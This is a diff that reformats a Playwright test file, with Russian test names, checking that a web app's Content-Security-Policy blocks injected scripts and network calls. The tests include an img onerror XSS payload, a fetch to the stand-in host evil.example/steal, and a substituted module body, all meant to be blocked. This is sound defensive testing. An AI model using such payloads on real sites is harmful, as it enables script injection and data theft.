@@ -5,7 +5,7 @@ const path = require('path');
 const { openApp, expectNoErrors, ROOT } = require('./helpers');
 
 test('в собранных файлах есть CSP: скрипты только по хэшу, сеть — только к нужным сервисам', async () => {
-  for(const f of ['index.html', 'friends/index.html']){
+  for (const f of ['index.html', 'friends/index.html']) {
     const html = fs.readFileSync(path.join(ROOT, f), 'utf8');
     const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/);
     expect(m, f).toBeTruthy();
@@ -27,7 +27,12 @@ test('внедрённый обработчик не выполняется, о�
     d.innerHTML = '<img src="data:," onerror="window.__pwned = 1">';
     document.body.append(d);
     let fetched = 'нет';
-    try{ await fetch('https://evil.example/steal?d=1'); fetched = 'да'; }catch(e){ fetched = 'заблокировано'; }
+    try {
+      await fetch('https://evil.example/steal?d=1');
+      fetched = 'да';
+    } catch (e) {
+      fetched = 'заблокировано';
+    }
     await new Promise(r => setTimeout(r, 300));
     return { pwned: window.__pwned || 0, fetched, seen };
   });
@@ -52,7 +57,10 @@ test('Excel: подмена файла модуля — браузер его н
   const { errors } = await openApp(page, { allowCsp: true });
   // своя копия подменена (маршрут, добавленный позже, срабатывает первым), CDN недоступен
   let served = 0;
-  await page.route('**/vendor/xlsx-*.js', r => { served++; r.fulfill({ contentType: 'application/javascript', body: 'window.__pwned = 1; window.XLSX = {};' }); });
+  await page.route('**/vendor/xlsx-*.js', r => {
+    served++;
+    r.fulfill({ contentType: 'application/javascript', body: 'window.__pwned = 1; window.XLSX = {};' });
+  });
   await page.evaluate(() => document.getElementById('exportXlsxBtn').click());
   await expect(page.locator('#toast')).toContainText('Не удалось загрузить модуль XLSX');
   expect(served).toBe(1);
